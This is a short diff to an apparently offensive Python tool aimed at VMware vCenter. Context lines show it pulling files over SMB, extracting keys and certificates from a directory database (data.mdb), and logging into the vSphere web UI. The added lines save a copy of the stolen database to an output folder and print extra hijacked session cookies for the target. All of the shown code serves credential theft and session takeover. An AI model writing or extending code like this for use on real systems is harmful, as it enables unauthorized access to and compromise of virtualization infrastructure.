@@ -1994,6 +1994,10 @@ def main():
             paths = discover_smb(args.t, args.u or '', args.p or '', args.d or '')
 
         mdb_path = resolve_mdb(paths, work_dir)
+        output_dir.mkdir(parents=True, exist_ok=True)
+        _mdb_dest = output_dir / 'data.mdb'
+        if mdb_path.resolve() != _mdb_dest.resolve():
+            shutil.copy2(mdb_path, _mdb_dest)
         sol_key, sol_cert = resolve_solution_creds(paths, verbose=args.verbose)
         key_pem, cert1_pem, cert2_pem, mdb_domain = certs_from_mdb(mdb_path, args.verbose)
         domain = args.d or mdb_domain
@@ -2017,6 +2021,10 @@ def main():
 
         print(f'\n[+] https://{target}/ui/')
         print(f'    {cname}={cval}')
+        for extra in ('VSPHERE-CLIENT-SESSION-INDEX', 'VSPHERE-USERNAME'):
+            v = ui_session.cookies.get(extra)
+            if v:
+                print(f'    {extra}={v}')
 
         if choice == '1':
             return
